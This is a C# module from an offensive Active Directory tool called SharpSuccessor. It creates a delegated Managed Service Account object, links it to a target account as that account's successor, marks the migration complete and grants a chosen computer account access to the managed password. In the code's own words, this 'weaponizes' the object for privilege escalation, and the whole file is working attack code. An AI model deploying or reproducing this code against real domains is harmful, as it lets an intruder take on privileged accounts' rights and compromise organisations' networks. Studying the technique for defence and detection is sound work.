using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace SharpSuccessor.Modules
{
    internal class dMSA
    {
        public static string accountToSidLookup(string account)
        {
            SearchResultCollection results;

            DirectoryEntry de = new DirectoryEntry();
            DirectorySearcher ds = new DirectorySearcher(de);

            string query = "(samaccountname=" + account + ")";
            ds.Filter = query;
            results = ds.FindAll();
            string accountSid = null;

            foreach (SearchResult sr in results)
            {
                SecurityIdentifier sid = new SecurityIdentifier(sr.Properties["objectSid"][0] as byte[], 0);
                accountSid = sid.Value;
            }

            return accountSid;
        }

        public static DirectoryEntry CreatedMSA(string path, string name)
        {

            string childName = "CN=" + name;

            try
            {
                DirectoryEntry parentEntry = new DirectoryEntry("LDAP://" + path);
                DirectoryEntry newChild = parentEntry.Children.Add(childName, "msDS-DelegatedManagedServiceAccount");
                newChild.Properties["msDS-DelegatedMSAState"].Value = 0;
                newChild.Properties["msDS-ManagedPasswordInterval"].Value = 30;
                newChild.CommitChanges();

                Console.WriteLine($"[+] Created dMSA object '{newChild.Name}' in '{path}'");

                return newChild;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                return null;
            }

        }

        public static void migratedMSA(DirectoryEntry dMSA, string target, string computer)
        {
            try
            {
                SearchResultCollection results;

                DirectoryEntry de = new DirectoryEntry();
                DirectorySearcher ds = new DirectorySearcher(de);

                string query = "(samaccountname=" + target + ")";
                ds.Filter = query;
                results = ds.FindAll();

                if (results.Count == 0)
                {
                    Console.WriteLine("[!] Cannot find account");
                    return;
                }

                string targetdn = null;

                foreach (SearchResult sr in results)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    targetdn = mde.Properties["distinguishedName"].Value.ToString();
                    Console.WriteLine("[+] " + target + "'s DN identified");
                }

                Console.WriteLine("[+] Attempting to write msDS-ManagedAccountPrecededByLink");
                dMSA.Properties["msDS-ManagedAccountPrecededByLink"].Value = targetdn;

                Console.WriteLine("[+] Wrote attribute successfully");
                Console.WriteLine("[+] Attempting to write  msDS-DelegatedMSAState attribute");
                dMSA.Properties["msDS-DelegatedMSAState"].Value = 2;
                Console.WriteLine("[+] Attempting to set access rights on the dMSA object");

                string sid = accountToSidLookup(computer);
                if (sid == null)
                {
                    Console.WriteLine("[!] Cannot find computer account");
                    return;
                }
                RawSecurityDescriptor rsd = new RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")");
                Byte[] descriptor = new byte[rsd.BinaryLength];
                rsd.GetBinaryForm(descriptor, 0);
                dMSA.Properties["msDS-GroupMSAMembership"].Add(descriptor);
                dMSA.CommitChanges();
                Console.WriteLine("[+] Successfully weaponized dMSA object");

            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error: " + ex.Message);
            }
        }
    }
}
